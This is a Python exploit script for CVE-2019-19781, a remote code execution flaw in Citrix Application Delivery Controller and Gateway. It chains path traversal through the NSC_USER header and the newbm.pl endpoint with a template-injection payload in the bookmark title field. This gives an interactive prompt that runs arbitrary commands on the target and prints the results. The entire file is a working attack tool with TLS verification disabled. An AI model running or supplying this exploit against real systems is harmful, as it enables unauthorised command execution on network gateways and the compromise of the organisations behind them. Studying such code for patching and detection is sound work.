import requests
import string
import random
import re
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
print("CVE-2019-19781 - Remote Code Execution in Citrix Application Delivery Controller and Citrix Gateway")
print("Found by Mikhail Klyuchnikov")
print("")
if len(sys.argv) < 2:
  print("[-] No URL provided")
  sys.exit(0)
while True:
    try:
      command = input("command > ")
      random_xml = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
      print("[+] Adding bookmark", random_xml + ".xml")
      burp0_url = sys.argv[1] + "/vpn/../vpns/portal/scripts/newbm.pl"
      burp0_headers = {"NSC_USER": "../../../../netscaler/portal/templates/" +
                      random_xml, "NSC_NONCE": "c", "Connection": "close"}
      burp0_data = {"url": "http://exemple.com", "title": "[%t=template.new({'BLOCK'='print `" + str(command) + "`'})%][ % t % ]", "desc": "test", "UI_inuse": "RfWeb"}
      r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data,verify=False)
      if r.status_code == 200:
        print("[+] Bookmark added")
      else:
        print("\n[-] Target not vulnerable or something went wrong")
        sys.exit(0)
      burp0_url = sys.argv[1] + "/vpns/portal/" + random_xml + ".xml"
      burp0_headers = {"NSC_USER": "../../../../netscaler/portal/templates/" +
                       random_xml, "NSC_NONCE": "c", "Connection": "close"}
      r = requests.get(burp0_url, headers=burp0_headers,verify=False)
      replaced = re.sub('^&#.*&#10;$', '', r.text, flags=re.MULTILINE)
      print("[+] Result of the command: \n")
      print(replaced)
    except KeyboardInterrupt:
            print("Exiting...")
            break